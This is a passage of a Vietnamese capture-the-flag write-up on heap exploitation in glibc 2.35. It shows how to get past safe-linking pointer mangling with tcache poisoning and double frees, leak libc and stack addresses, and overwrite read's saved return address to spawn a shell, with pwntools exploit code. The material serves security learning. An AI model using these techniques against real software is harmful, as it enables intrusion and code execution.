  - Vẫn kỹ thuật cũ nhưng ở version này giá trị fd pointer đã được được thay đổi bằng một phép xor và free_hook lẫn malloc_hook ở libc-2.35 không còn hoạt động do đó ta cũng không thể ghi đè vào đây.
  - Yêu cầu của malloc là chunk & 0xf = 0.
  ```
  #define PROTECT_PTR(pos, ptr) \
    ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
  ```
  - Ban đầu ta sẽ free 1 chunk và leak fd pointer vì đây là chunk đầu nên giá trị fd pointer là giá trị của phép xor với 0, ta có thể dùng giá trị này để xor với chunk mà ta cần cấp phát rồi đưa vào fd pointer.
  - Mục tiêu là thay đổi saverip của hàm read. Đầu tiên sẽ leak địa chỉ libc từ đó leak địa chỉ stack bằng environ để overwrite saverip read.
  - leak giá trị fd pointer, double free và leak libc
  ```
  size = 0x30
book(1, size)
choice(3)
choice(4)
r.recvuntil(b'Content: ')
fd_pointer = r.recv(2)
fd_pointer = u32(fd_pointer + b'\x00'*2)
print(hex(fd_pointer))
book(2, size, b'\x00'*16)
choice(3)

new_fd_pointer = fd_pointer^exe.sym['stderr']
book(2, size, p64(new_fd_pointer))
book(1, size)
book(1, size, b'\xa0')
choice(4)
r.recvuntil(b'Content: ')
libc_leak = r.recv(6)
libc.address = u64(libc_leak + b'\x00'*2) - libc.sym['_IO_2_1_stderr_']
print(hex(libc.address))
  ```
  - double free leak giá trị stack
  ```
  book(1, size)
choice(3)
book(2, size, b'\x00'*16)
choice(3)
print(hex(libc.sym['environ']))
new_fd_pointer = fd_pointer^(libc.sym['environ']-0x10)
book(2, size, p64(new_fd_pointer))
book(1, size)
book(1, size, b'a'*13 + b'bcd')
choice(4)
r.recvuntil(b'abcd')
stack = r.recv(6)
stack = u64(stack + b'\x00'*2)
print(hex(stack))
  ```
  - overwrite saverip read thực thi system('/bin/sh')
  - ![image](https://user-images.githubusercontent.com/113702087/218765174-5b90873a-5ee8-4f12-896c-a91904ee7b60.png)
  - ![image](https://user-images.githubusercontent.com/113702087/218765230-57ae79c1-bd4f-4269-99cd-86c5176b1fa8.png)
  - ![image](https://user-images.githubusercontent.com/113702087/218765325-e1799b12-c8e8-42f0-94a6-4f26ee90f257.png)
